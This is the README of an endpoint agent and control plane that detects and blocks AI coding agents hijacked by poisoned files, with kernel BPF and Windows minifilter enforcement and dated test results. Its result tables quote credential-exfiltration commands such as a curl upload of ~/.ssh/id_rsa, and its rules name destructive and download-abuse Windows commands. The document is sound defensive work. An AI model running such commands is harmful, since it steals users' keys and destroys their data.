# Endpoint fleet platform: checkpointd agent, control plane, persistent AI Risk DB, portal

The gateway protects AI traffic that is routed through it. The fleet platform adds the **kernel-checkpoint direction** from [architecture.md §19](../architecture.md): an agent on every endpoint that sees what AI agents actually *do* (files they read, commands they run, connections they open), driven by a persistent, signed AI Risk DB.

```
 Endpoint (checkpointd)                         Control plane (same FastAPI app, /v1/cp)        Portal (/portal)
 ─────────────────────                          ────────────────────────────────────────        ──────────────
 sensors ─► local engine ─► enforce             persistent AI Risk DB (SQLite → Postgres)       Overview
   process/exec (poll; BPF LSM / minifilter)      61 seed entries + learned + analyst            Detections + lineage
   files (workspace pre-scan)                   content pipeline:                               Endpoints (ring, mode)
   network egress                                 snapshot → gate → Ed25519 sign → ring rollout AI Risk DB (OWASP/ATLAS)
 signed content bundle ◄──── heartbeat ───────    CANARY → EARLY → BROAD → GA, auto-rollback    Content releases
 telemetry (offline outbox) ───────────────────► events, health, hit counts                     Deploy · Audit log
                                                learning loop: gateway quarantine → LEARNED entries → auto-release to CANARY
```

## Run it

```bash
./scripts/start_fleet_demo.sh          # gateway + portal on :8080, two agents (CANARY + BROAD), attack, learning loop
open http://localhost:8080/portal
pkill -f agent.checkpointd; pkill -f "uvicorn src.main:app"    # stop
```

To run an agent by hand:

```bash
python -m agent.checkpointd --server http://127.0.0.1:8080 --enroll-token enroll-demo-default \
  --watch ~/work --watch ~/Downloads --ring CANARY
```

By default `claude`, `gemini`, `cursor`, `aider`, `codex`, `copilot`, `ollama` and similar processes count as AI agents (`--ai-process` replaces the list). Running it in ENFORCE mode on your own machine **will kill** commands those tools run that touch `~/.ssh`, `~/.aws` and other credential paths.

**Linux with the kernel checkpoint** (root, a kernel with `bpf` in `/sys/kernel/security/lsm`, `clang`, `bpftool`, `libbpf-dev`):

```bash
make -C agent/kernel/linux                     # BPF program + loader; checkpointd attaches it automatically when run as root
sudo ./scripts/linux_kernel_demo.sh            # gateway + root agent + attack, then the kernel's own events
```

**Windows** (elevated PowerShell, Python 3.12 with `requirements.txt` installed):

```powershell
.\agent\windows\install.ps1 -Server http://127.0.0.1:8080 -Watch C:\work -AiProcess claude,cursor,demo_ai_agent
.\agent\windows\install.ps1 -Uninstall
```

The installer registers `checkpointd` as a scheduled task that runs as LocalSystem at boot and is restarted if it exits. It also limits the state directory to SYSTEM and Administrators. Running as SYSTEM, the agent protects every local user's credential stores: `.ssh`, `.aws`, `.azure`, `.kube`, Credential Manager, DPAPI keys, and Chrome/Edge saved passwords. `-Driver <checkpoint.inf>` also installs the minifilter, but only on a machine with test signing enabled (see the limits below).

## What each part does

| Part | Code | Behaviour |
|---|---|---|
| **Exec checkpoint** | `agent/checkpointd/sensors/process.py`, `engine.py` | Rebuilds the lineage of every new process; only AI-agent descendants are judged. Credential path + network tool → CRITICAL `TOOL_HIJACK`; credential read → `SECRET_ACCESS`; destructive commands; everything else goes through the full AI-EDR pipeline as a tool call. ENFORCE kills the process tree. Re-judges a young process when its command line changes (fork/exec race) |
| **File checkpoint** | `sensors/files.py`, `daemon.py` | Pre-scans documents in watched workspaces with the full pipeline (hidden layers, Tier 1–3, IOAs). Poisoned file → original moved to a 0400 quarantine, `<name>.sanitized.txt` written in its place. Clean files are untouched |
| **Egress checkpoint** | `sensors/process.py` | AI-lineage connections to anything outside the allow-list (LLM APIs, GitHub, package registries, private ranges) → alert, or kill with `--block-egress` |
| **Windows rules** | `engine.py`, `config.py` | `%USERPROFILE%`, `$env:USERPROFILE`, `~` and `\` paths are normalised before matching. `curl.exe`, PowerShell download cmdlets and `Net.WebClient` count as egress tools. Shadow-copy deletion, `wbadmin delete`, `bcdedit … recoveryenabled no`, `cipher /w`, `rd /s /q C:\` → block. Download-or-execute abuse of `certutil`, `bitsadmin`, `mshta`, `regsvr32`, `rundll32` and `-EncodedCommand` → alert |
| **Kernel checkpoint (Linux)** | `agent/kernel/linux/`, `sensors/linux_ebpf.py` | BPF LSM program: lineage inherited on fork in-kernel; AI agents also recognised by name at exec in the kernel, so an agent that acts at once is covered before user space sees it; `file_open` on protected inodes and `socket_connect` to non-allow-listed IPv4 → `-EPERM` inside the syscall; every AI-lineage exec reported to user space. The kernel only enforces maps; it never parses content |
| **Kernel checkpoint (Windows)** | `agent/kernel/windows/`, `sensors/windows_driver.py` | File-system minifilter + process-creation callback. The driver tracks AI lineage at process creation (AI agents by image name, or registered by `checkpointd`). Before an AI-lineage process starts, the driver sends its image and command line to `checkpointd`. If `checkpointd` judges it a block, creation fails with `STATUS_ACCESS_DENIED`. With no answer within 250 ms, the process is allowed (fail open). AI-lineage opens of protected credential paths fail in `IRP_MJ_CREATE`, even with `checkpointd` down. Only SYSTEM and Administrators can connect to the communication port |
| **Content safety** | `src/control_plane/content.py`, `agent/checkpointd/engine.py` | Bundles are Ed25519-signed per tenant; the agent pins the key at enrollment, verifies signature and SHA-256 and keeps the last good content on any failure |
| **Quality gate** | `config/gate_corpus.json` | Every release replays 35 attacks (EN + KO) and 40 benign texts (prose, code, Korean). Fails on any false positive, recall < 85 % or a recall drop > 5 points |
| **Rollout** | `src/control_plane/store.py` | Rings CANARY → EARLY → BROAD → GA; an endpoint gets the newest release promoted to its ring or later. ≥ 2 agents reporting `CONTENT_LOAD_FAILED` / `SAFE_MODE` for a version → automatic rollback |
| **Agent safety** | `daemon.py`, `state.py` | Boot-loop guard (safe mode = monitor only after 2 unclean exits), fail-open on detector errors, atomic state writes, offline outbox with idempotent event IDs |
| **Learning loop** | `src/control_plane/api.py` | Gateway promotions become TENANT-tier `LEARNED` entries; a confident re-observation confirms pending ones; auto-release builds, gates and promotes to CANARY only |
| **Taxonomy** | `src/control_plane/taxonomy.py` | Every entry and category maps to OWASP Top 10 for LLM Apps (2025) and a MITRE ATLAS technique |

## Results (31 Oct 2026, MacBook, user-space sensors)

| Check | Result |
|---|---|
| Hijacked agent runs `sh -c "…; curl -F key=@~/.ssh/id_rsa https://…"` | **Killed** before the curl step (exit −9); lineage `demo_ai_agent → sh` shown in the portal |
| Normal agent commands (`git --version`, `python3 -c …`) | Allowed, no alert |
| Poisoned resume PDF and README in the workspace | **Sanitized** (originals quarantined); clean `notes.md` untouched |
| Gateway zero-day (Korean, hidden in a FAQ) | Learned → release v2 built, gated (88.6 % recall, 0 / 40 FP), signed, on the CANARY endpoint within ~5 s; BROAD stayed on v1 until promoted |
| Tampered bundle (entry removed; or hash recomputed) | Rejected (`ValueError` / `InvalidSignature`), previous content kept |
| Entry that fires on benign text (`"ignore the typo"`) | Release **GATE_FAILED**; promotion refused (409) |
| Two canaries report content failure | Release auto-rolled back; canaries return to v1 |
| Tests | 23 new tests (`tests/test_control_plane.py`, `tests/test_agent.py`); full suite 81 passed, 2 xfailed |

![Portal overview](screens/portal_overview.png)
![Detection with process lineage](screens/portal_detections.png)
![Content releases](screens/portal_releases.png)

## Results: Linux kernel checkpoint (1 Nov 2026)

Fedora 44 VM (Lima on the MacBook), kernel 6.19.10 aarch64, btrfs root, `bpf` in the active LSM list. Built with clang 22, bpftool 7.6 and libbpf 1.6.

| Check | Result |
|---|---|
| BPF verifier | Accepts all 6 programs: LSM `file_open`, `socket_connect`, `bprm_check_security`; `tp_btf` fork, exit, exec |
| AI-lineage `cat ~/.ssh/id_rsa` (tmpfs and the btrfs home) | `Operation not permitted` inside `open()`, `FILE_DENY` event. The agent itself can still read the file |
| Agent that reads a key the moment it starts, with no user-space registration | Denied: the kernel marks it at exec by its name |
| Grandchild (`bash → bash → python3 → open()`) | Denied: lineage is inherited on fork |
| AI-lineage `connect()` to 1.1.1.1:80 | `EPERM` and a `NET_DENY` event; loopback still works |
| Monitor mode | Read allowed, `FILE_SEEN` reported |
| `scripts/linux_kernel_demo.sh` | Delayed exfiltration killed by the user-space sensor. Poisoned files sanitized. A native agent that ran `curl -F key=@~/.ssh/id_rsa` immediately was stopped in the kernel at `connect()` (`curl` exit 7); the polling sensor never saw it |
| Tests as root with the program attached | 8/8 kernel tests. Full suite: 116 passed, 2 skipped (Windows only), 2 xpassed. No loader processes left behind |
| CI on GitHub's Ubuntu 24.04 runner (kernel 7.0 x86_64, clang 18, bpftool 7.7, libbpf 1.3) | Program and loader build. The kernel tests skip, because Ubuntu does not enable the BPF LSM by default |

## Results: Windows (2 Nov 2026, GitHub Actions)

`.github/workflows/endpoint-agent.yml` runs on every push that touches the agent, the engine or the tests.

| Check | Result |
|---|---|
| Agent and control-plane tests (`windows-latest`, Python 3.12) | 51 passed, 1 skipped (the POSIX-shell test). This includes a live kill of a hijacked agent's PowerShell exfiltration command |
| `install.ps1` as a SYSTEM scheduled task | Task running. The agent enrolled (CANARY, ENFORCE) and loaded signed content v1 |
| Poisoned README and resume PDF in the watched workspace | Both **sanitized**, with the originals quarantined; `notes.md` untouched |
| Hijacked agent runs `powershell … curl.exe -F key=@$env:USERPROFILE\.ssh\id_rsa …` | **Killed** before the `curl` step (exit 15). The control plane shows the lineage `powershell.exe ← python.exe ← python.exe ← pwsh.exe` |
| `install.ps1 -Uninstall` | Task removed, agent stopped |
| Minifilter build (`windows-2022`, VS 2022 + WDK 10.0.26100) | Compiles with warnings treated as errors (`/W4 /WX`). InfVerif and Inf2Cat pass. The driver imports `FltRegisterFilter`, `FltCreateCommunicationPort`, `FltSendMessage` and `PsSetCreateProcessNotifyRoutineEx`. `/INTEGRITYCHECK` is set (DllCharacteristics `0x41E0`). The unsigned package is kept as a CI artifact. **Not loaded:** see the limits below |

The first CI run found a bug that only shows up in a real service. Installed as SYSTEM, `checkpointd` crashed on start, because Python reads text in the Windows ANSI code page by default and the Risk DB seed contains Korean. The test step had hidden this by setting `PYTHONUTF8=1`. Every text read and write now passes `encoding="utf-8"`, and the service also runs with `-X utf8`.

## Honest limits

- **The user-space sensor reacts; it does not pre-empt.** It polls every 50 ms and kills; a command that finishes faster can complete (reported as `EXITED_BEFORE_KILL`). Pre-exec denial needs a kernel checkpoint: the Linux BPF LSM program here (verified), the Windows minifilter here (built, not yet loaded), or macOS Endpoint Security (`AUTH_EXEC`/`AUTH_OPEN`, needs an Apple entitlement).
- **The Linux kernel checkpoint is verified on one kernel** (Fedora 44, 6.19, arm64). It needs `bpf` in the active LSM list. Fedora enables it, but Ubuntu and most other distributions need `lsm=…,bpf` on the kernel command line. Egress denial covers IPv4 only, and the allow-list is by IP address.
- **The Windows driver is built in CI, not loaded anywhere yet.** Loading it needs a test machine with test signing on (`bcdedit /set testsigning on`, then a reboot), or an attestation-signed build from the Microsoft Partner Center. Altitude 385210 is a placeholder; production needs one assigned by Microsoft. On Windows, egress is still checked by the user-space poll; the production path is a WFP callout driver.
- **On Windows the agent is a SYSTEM scheduled task,** not a protected (PPL) service, so an administrator can stop it.
- **File pre-scan is a workspace sweep,** not a kernel read hook: files outside watched folders are not scanned, and a file read before the sweep reaches it is not stopped.
- **Signing key** lives on disk (`data/keys/`, 0600); production uses an HSM / cloud KMS, and the installer pins the public key instead of trust-on-first-enrollment.
- **SQLite** stands in for Postgres; one control plane node; no RBAC/SSO on the portal yet (optional `AI_EDR_API_KEY` only).
- **No tamper protection** for the agent process itself yet (protected service / system extension).
